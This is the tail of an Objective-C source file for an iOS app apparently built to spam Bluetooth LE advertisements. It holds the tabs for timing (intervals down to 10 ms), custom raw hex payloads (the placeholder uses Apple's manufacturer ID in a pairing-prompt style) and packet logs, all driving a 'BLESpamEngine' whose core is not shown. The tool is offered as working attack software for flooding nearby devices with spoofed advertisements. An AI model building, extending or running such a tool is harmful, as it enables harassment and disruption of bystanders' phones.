        [labelStack.trailingAnchor constraintEqualToAnchor:presetsCard.trailingAnchor constant:-16],
        [labelStack.bottomAnchor  constraintEqualToAnchor:presetsCard.bottomAnchor constant:-14],
    ]];

    // ── Slider card ───────────────────────────────────────────────────────────
    UIView *sliderCard = card();
    [content addSubview:sliderCard];

    UILabel *sliderTitle = label(@"CUSTOM INTERVAL", [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold], CLR_FG3);
    [sliderCard addSubview:sliderTitle];

    _valueLabel = label(@"100 ms", [UIFont monospacedDigitSystemFontOfSize:32 weight:UIFontWeightBold], CLR_FG);
    [sliderCard addSubview:_valueLabel];

    _slider = [[UISlider alloc] initWithFrame:CGRectZero];
    _slider.translatesAutoresizingMaskIntoConstraints = NO;
    _slider.minimumValue = 10;
    _slider.maximumValue = 2000;
    _slider.value = 100;
    _slider.minimumTrackTintColor = CLR_ACCENT;
    _slider.thumbTintColor = CLR_FG;
    [_slider addTarget:self action:@selector(sliderChanged) forControlEvents:UIControlEventValueChanged];
    [sliderCard addSubview:_slider];

    UILabel *minL = label(@"10 ms", [UIFont systemFontOfSize:11], CLR_FG3);
    UILabel *maxL = label(@"2000 ms", [UIFont systemFontOfSize:11], CLR_FG3);
    maxL.textAlignment = NSTextAlignmentRight;
    minL.translatesAutoresizingMaskIntoConstraints = NO;
    maxL.translatesAutoresizingMaskIntoConstraints = NO;
    [sliderCard addSubview:minL]; [sliderCard addSubview:maxL];

    [NSLayoutConstraint activateConstraints:@[
        [sliderCard.topAnchor      constraintEqualToAnchor:presetsCard.bottomAnchor constant:16],
        [sliderCard.leadingAnchor  constraintEqualToAnchor:content.leadingAnchor constant:16],
        [sliderCard.trailingAnchor constraintEqualToAnchor:content.trailingAnchor constant:-16],

        [sliderTitle.topAnchor     constraintEqualToAnchor:sliderCard.topAnchor constant:14],
        [sliderTitle.leadingAnchor constraintEqualToAnchor:sliderCard.leadingAnchor constant:16],

        [_valueLabel.topAnchor    constraintEqualToAnchor:sliderTitle.bottomAnchor constant:8],
        [_valueLabel.centerXAnchor constraintEqualToAnchor:sliderCard.centerXAnchor],

        [_slider.topAnchor     constraintEqualToAnchor:_valueLabel.bottomAnchor constant:12],
        [_slider.leadingAnchor constraintEqualToAnchor:sliderCard.leadingAnchor constant:16],
        [_slider.trailingAnchor constraintEqualToAnchor:sliderCard.trailingAnchor constant:-16],

        [minL.topAnchor     constraintEqualToAnchor:_slider.bottomAnchor constant:4],
        [minL.leadingAnchor constraintEqualToAnchor:sliderCard.leadingAnchor constant:16],
        [minL.bottomAnchor  constraintEqualToAnchor:sliderCard.bottomAnchor constant:-14],

        [maxL.topAnchor      constraintEqualToAnchor:_slider.bottomAnchor constant:4],
        [maxL.trailingAnchor constraintEqualToAnchor:sliderCard.trailingAnchor constant:-16],
        [maxL.bottomAnchor   constraintEqualToAnchor:sliderCard.bottomAnchor constant:-14],
    ]];

    // ── Info card ─────────────────────────────────────────────────────────────
    UIView *infoCard = card();
    [content addSubview:infoCard];

    UILabel *infoText = label(
        @"Changes take effect immediately — no need to restart broadcasting.",
        [UIFont systemFontOfSize:13], CLR_FG2
    );
    infoText.numberOfLines = 0;
    [infoCard addSubview:infoText];

    [NSLayoutConstraint activateConstraints:@[
        [infoCard.topAnchor      constraintEqualToAnchor:sliderCard.bottomAnchor constant:16],
        [infoCard.leadingAnchor  constraintEqualToAnchor:content.leadingAnchor constant:16],
        [infoCard.trailingAnchor constraintEqualToAnchor:content.trailingAnchor constant:-16],
        [infoCard.bottomAnchor   constraintEqualToAnchor:content.bottomAnchor constant:-32],

        [infoText.topAnchor     constraintEqualToAnchor:infoCard.topAnchor constant:14],
        [infoText.leadingAnchor constraintEqualToAnchor:infoCard.leadingAnchor constant:16],
        [infoText.trailingAnchor constraintEqualToAnchor:infoCard.trailingAnchor constant:-16],
        [infoText.bottomAnchor  constraintEqualToAnchor:infoCard.bottomAnchor constant:-14],
    ]];
}

- (void)presetChanged {
    NSArray *vals = @[@20, @50, @100, @200, @500];
    NSInteger ms = [vals[_presets.selectedSegmentIndex] integerValue];
    _slider.value = (float)ms;
    _valueLabel.text = [NSString stringWithFormat:@"%ld ms", (long)ms];
    BLESpamEngine.shared.interval = ms / 1000.0;
    UIImpactFeedbackGenerator *h = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
    [h impactOccurred];
}

- (void)sliderChanged {
    NSInteger ms = ((NSInteger)_slider.value / 10) * 10;
    _valueLabel.text = [NSString stringWithFormat:@"%ld ms", (long)ms];
    BLESpamEngine.shared.interval = ms / 1000.0;
    _presets.selectedSegmentIndex = UISegmentedControlNoSegment;
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Custom Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface CustomVC : UIViewController <UITextFieldDelegate>
@property UITextField *hexField;
@property UILabel *parseResult;
@end

@implementation CustomVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Custom";
    self.navigationController.navigationBar.prefersLargeTitles = YES;
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeAlways;

    UIView *fieldCard = card();
    [self.view addSubview:fieldCard];

    UILabel *fieldTitle = label(@"RAW HEX PAYLOAD", [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold], CLR_FG3);
    [fieldCard addSubview:fieldTitle];

    UILabel *hint = label(@"Enter manufacturer data bytes (Company ID first, little-endian)", [UIFont systemFontOfSize:12], CLR_FG3);
    hint.numberOfLines = 2;
    [fieldCard addSubview:hint];

    _hexField = [[UITextField alloc] initWithFrame:CGRectZero];
    _hexField.translatesAutoresizingMaskIntoConstraints = NO;
    _hexField.backgroundColor = [UIColor colorWithWhite:.08 alpha:1];
    _hexField.textColor = CLR_ACCENT;
    _hexField.font = [UIFont monospacedSystemFontOfSize:15 weight:UIFontWeightMedium];
    _hexField.layer.cornerRadius = 10;
    _hexField.attributedPlaceholder = [[NSAttributedString alloc] initWithString:@"4C 00 07 19 07 00 …"
        attributes:@{NSForegroundColorAttributeName: CLR_FG3}];
    _hexField.autocapitalizationType = UITextAutocapitalizationTypeAllCharacters;
    _hexField.autocorrectionType = UITextAutocorrectionTypeNo;
    _hexField.keyboardType = UIKeyboardTypeASCIICapable;
    _hexField.leftView = [[UIView alloc] initWithFrame:CGRectMake(0,0,12,0)];
    _hexField.leftViewMode = UITextFieldViewModeAlways;
    _hexField.returnKeyType = UIReturnKeyDone;
    _hexField.delegate = self;
    [_hexField addTarget:self action:@selector(hexChanged) forControlEvents:UIControlEventEditingChanged];
    [fieldCard addSubview:_hexField];

    _parseResult = label(@"", [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular], CLR_FG2);
    _parseResult.numberOfLines = 0;
    [fieldCard addSubview:_parseResult];

    UIButton *applyBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    applyBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [applyBtn setTitle:@"Apply & Set Mode to Custom" forState:UIControlStateNormal];
    applyBtn.tintColor = CLR_FG;
    applyBtn.backgroundColor = CLR_ACCENT;
    applyBtn.layer.cornerRadius = CORNER_BTN;
    applyBtn.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightSemibold];
    [applyBtn addTarget:self action:@selector(applyTapped) forControlEvents:UIControlEventTouchUpInside];
    [fieldCard addSubview:applyBtn];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [fieldCard.topAnchor      constraintEqualToAnchor:safe.topAnchor constant:16],
        [fieldCard.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [fieldCard.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],

        [fieldTitle.topAnchor     constraintEqualToAnchor:fieldCard.topAnchor constant:14],
        [fieldTitle.leadingAnchor constraintEqualToAnchor:fieldCard.leadingAnchor constant:16],

        [hint.topAnchor     constraintEqualToAnchor:fieldTitle.bottomAnchor constant:4],
        [hint.leadingAnchor constraintEqualToAnchor:fieldCard.leadingAnchor constant:16],
        [hint.trailingAnchor constraintEqualToAnchor:fieldCard.trailingAnchor constant:-16],

        [_hexField.topAnchor     constraintEqualToAnchor:hint.bottomAnchor constant:10],
        [_hexField.leadingAnchor constraintEqualToAnchor:fieldCard.leadingAnchor constant:16],
        [_hexField.trailingAnchor constraintEqualToAnchor:fieldCard.trailingAnchor constant:-16],
        [_hexField.heightAnchor  constraintEqualToConstant:44],

        [_parseResult.topAnchor     constraintEqualToAnchor:_hexField.bottomAnchor constant:8],
        [_parseResult.leadingAnchor constraintEqualToAnchor:fieldCard.leadingAnchor constant:16],
        [_parseResult.trailingAnchor constraintEqualToAnchor:fieldCard.trailingAnchor constant:-16],

        [applyBtn.topAnchor     constraintEqualToAnchor:_parseResult.bottomAnchor constant:12],
        [applyBtn.leadingAnchor constraintEqualToAnchor:fieldCard.leadingAnchor constant:16],
        [applyBtn.trailingAnchor constraintEqualToAnchor:fieldCard.trailingAnchor constant:-16],
        [applyBtn.heightAnchor  constraintEqualToConstant:44],
        [applyBtn.bottomAnchor  constraintEqualToAnchor:fieldCard.bottomAnchor constant:-16],
    ]];
}

- (void)hexChanged {
    NSData *d = [self parseHex:_hexField.text];
    if (d) {
        _parseResult.text = [NSString stringWithFormat:@"✓ %lu bytes", (unsigned long)d.length];
        _parseResult.textColor = CLR_SUCCESS;
    } else {
        _parseResult.text = _hexField.text.length ? @"Invalid hex" : @"";
        _parseResult.textColor = CLR_DANGER;
    }
}

- (NSData *)parseHex:(NSString *)s {
    NSString *clean = [[s componentsSeparatedByCharactersInSet:
        [NSCharacterSet characterSetWithCharactersInString:@" :,-"]] componentsJoinedByString:@""];
    if (clean.length < 2 || clean.length % 2 != 0) return nil;
    NSMutableData *d = [NSMutableData data];
    for (NSUInteger i = 0; i < clean.length; i += 2) {
        NSString *b = [clean substringWithRange:NSMakeRange(i, 2)];
        unsigned int v = 0;
        if (![[NSScanner scannerWithString:b] scanHexInt:&v]) return nil;
        uint8_t byte = (uint8_t)v;
        [d appendBytes:&byte length:1];
    }
    return d;
}

- (void)applyTapped {
    NSData *d = [self parseHex:_hexField.text];
    if (!d) {
        UINotificationFeedbackGenerator *f = [UINotificationFeedbackGenerator new];
        [f notificationOccurred:UINotificationFeedbackTypeError];
        return;
    }
    BLESpamEngine.shared.customPayload = d;
    BLESpamEngine.shared.mode = BLEModeCustom;
    UINotificationFeedbackGenerator *f = [UINotificationFeedbackGenerator new];
    [f notificationOccurred:UINotificationFeedbackTypeSuccess];
    _parseResult.text = [NSString stringWithFormat:@"✓ Applied %lu bytes as Custom payload", (unsigned long)d.length];
    _parseResult.textColor = CLR_SUCCESS;
    [_hexField resignFirstResponder];
}

- (BOOL)textFieldShouldReturn:(UITextField *)tf { [tf resignFirstResponder]; return YES; }

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Logs Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface LogsVC : UIViewController <UITableViewDataSource>
@property UITableView *tv;
@property NSMutableArray<NSString *> *logs;
@property UILabel *counterLabel;
@end

@implementation LogsVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Logs";
    self.navigationController.navigationBar.prefersLargeTitles = YES;
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeAlways;

    _logs = [NSMutableArray array];

    // Stats card
    UIView *statsCard = card();
    [self.view addSubview:statsCard];

    _counterLabel = label(@"0", [UIFont monospacedDigitSystemFontOfSize:42 weight:UIFontWeightBold], CLR_ACCENT);
    UILabel *counterCaption = label(@"Total packets sent", [UIFont systemFontOfSize:13], CLR_FG2);
    [statsCard addSubview:_counterLabel];
    [statsCard addSubview:counterCaption];

    UIButton *clearBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    clearBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [clearBtn setTitle:@"Clear" forState:UIControlStateNormal];
    clearBtn.tintColor = CLR_DANGER;
    clearBtn.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
    [clearBtn addTarget:self action:@selector(clearLogs) forControlEvents:UIControlEventTouchUpInside];
    [statsCard addSubview:clearBtn];

    // Table
    _tv = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tv.translatesAutoresizingMaskIntoConstraints = NO;
    _tv.backgroundColor = CLR_BG;
    _tv.dataSource = self;
    _tv.rowHeight = UITableViewAutomaticDimension;
    _tv.estimatedRowHeight = 44;
    [_tv registerClass:[UITableViewCell class] forCellReuseIdentifier:@"log"];
    [self.view addSubview:_tv];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [statsCard.topAnchor      constraintEqualToAnchor:safe.topAnchor constant:12],
        [statsCard.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [statsCard.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],

        [_counterLabel.topAnchor    constraintEqualToAnchor:statsCard.topAnchor constant:14],
        [_counterLabel.leadingAnchor constraintEqualToAnchor:statsCard.leadingAnchor constant:16],

        [counterCaption.leadingAnchor  constraintEqualToAnchor:statsCard.leadingAnchor constant:16],
        [counterCaption.topAnchor      constraintEqualToAnchor:_counterLabel.bottomAnchor constant:2],
        [counterCaption.bottomAnchor   constraintEqualToAnchor:statsCard.bottomAnchor constant:-14],

        [clearBtn.trailingAnchor  constraintEqualToAnchor:statsCard.trailingAnchor constant:-16],
        [clearBtn.centerYAnchor   constraintEqualToAnchor:statsCard.centerYAnchor],

        [_tv.topAnchor      constraintEqualToAnchor:statsCard.bottomAnchor constant:8],
        [_tv.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tv.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tv.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    // Hook engine callback
    __weak typeof(self) ws = self;
    BLESpamEngine.shared.onPacketSent = ^(NSData *payload, NSUInteger total) {
        NSMutableString *hex = [NSMutableString string];
        const uint8_t *b = payload.bytes;
        for (NSUInteger i = 0; i < MIN(payload.length, 8); i++) {
            [hex appendFormat:@"%02X ", b[i]];
        }
        if (payload.length > 8) [hex appendString:@"…"];
        NSString *entry = [NSString stringWithFormat:@"#%lu  %@", (unsigned long)total, hex];
        dispatch_async(dispatch_get_main_queue(), ^{
            [ws.logs insertObject:entry atIndex:0];
            if (ws.logs.count > 200) [ws.logs removeLastObject];
            ws.counterLabel.text = [NSString stringWithFormat:@"%lu", (unsigned long)total];
            [ws.tv reloadData];
        });
    };
}

- (void)clearLogs {
    [_logs removeAllObjects];
    [_tv reloadData];
}

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s { return _logs.count; }
- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s { return @"Live Log"; }

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:@"log" forIndexPath:ip];
    cell.backgroundColor = CLR_CARD;
    UIListContentConfiguration *cfg = [cell defaultContentConfiguration];
    cfg.text = _logs[ip.row];
    cfg.textProperties.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    cfg.textProperties.color = CLR_FG2;
    cell.contentConfiguration = cfg;
    cell.selectionStyle = UITableViewCellSelectionStyleNone;
    return cell;
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Tab Bar Controller
// ─────────────────────────────────────────────────────────────────────────────

@interface MainTabBarController : UITabBarController
@end

@implementation MainTabBarController

- (void)viewDidLoad {
    [super viewDidLoad];

    // Classic tab bar — edge-to-edge, fully opaque blur
    UITabBar *bar = self.tabBar;
    bar.translucent = YES;
    bar.tintColor = CLR_ACCENT;
    bar.unselectedItemTintColor = CLR_FG3;

    // Blur background
    UIBlurEffect *blur = [UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemChromeMaterialDark];
    UIVisualEffectView *blurView = [[UIVisualEffectView alloc] initWithEffect:blur];
    blurView.frame = bar.bounds;
    blurView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    blurView.alpha = 0.92;
    [bar insertSubview:blurView atIndex:0];

    // Top separator line
    UIView *line = [[UIView alloc] initWithFrame:CGRectMake(0, 0, UIScreen.mainScreen.bounds.size.width, .5)];
    line.backgroundColor = [UIColor colorWithWhite:1 alpha:.15];
    line.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [bar addSubview:line];

    // Appearance for iOS 15+
    UITabBarAppearance *a = [[UITabBarAppearance alloc] init];
    [a configureWithTransparentBackground];
    a.backgroundColor = [UIColor colorWithRed:.11 green:.11 blue:.12 alpha:.88];
    bar.standardAppearance = a;
    bar.scrollEdgeAppearance = a;

    // ViewControllers
    auto makeNav = ^UINavigationController *(UIViewController *vc, NSString *title, NSString *icon, NSString *selectedIcon) {
        UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:vc];
        UIImage *img  = [UIImage systemImageNamed:icon];
        UIImage *sel  = [UIImage systemImageNamed:selectedIcon ?: icon];
        nav.tabBarItem = [[UITabBarItem alloc] initWithTitle:title image:img selectedImage:sel];
        // Nav bar appearance
        UINavigationBarAppearance *na = [[UINavigationBarAppearance alloc] init];
        [na configureWithOpaqueBackground];
        na.backgroundColor = CLR_BG;
        na.titleTextAttributes = @{NSForegroundColorAttributeName: CLR_FG};
        na.largeTitleTextAttributes = @{NSForegroundColorAttributeName: CLR_FG};
        nav.navigationBar.standardAppearance = na;
        nav.navigationBar.scrollEdgeAppearance = na;
        nav.navigationBar.tintColor = CLR_ACCENT;
        return nav;
    };

    self.viewControllers = @[
        makeNav([PayloadsVC new],  @"Payloads", @"antenna.radiowaves.left.and.right", @"antenna.radiowaves.left.and.right.fill"),
        makeNav([TimingVC new],    @"Timing",   @"timer",                             @"timer"),
        makeNav([CustomVC new],    @"Custom",   @"wrench.and.screwdriver",            @"wrench.and.screwdriver.fill"),
        makeNav([LogsVC new],      @"Logs",     @"list.bullet.rectangle",             @"list.bullet.rectangle.fill"),
    ];

    // Engine error callback
    BLESpamEngine.shared.onError = ^(NSString *msg) {
        dispatch_async(dispatch_get_main_queue(), ^{
            UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Bluetooth Error"
                                                                       message:msg
                                                                preferredStyle:UIAlertControllerStyleAlert];
            [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            [self presentViewController:a animated:YES completion:nil];
        });
    };
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - AppDelegate + main
// ─────────────────────────────────────────────────────────────────────────────

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.overrideUserInterfaceStyle = UIUserInterfaceStyleDark;
    self.window.rootViewController = [MainTabBarController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, @"AppDelegate");
    }
}
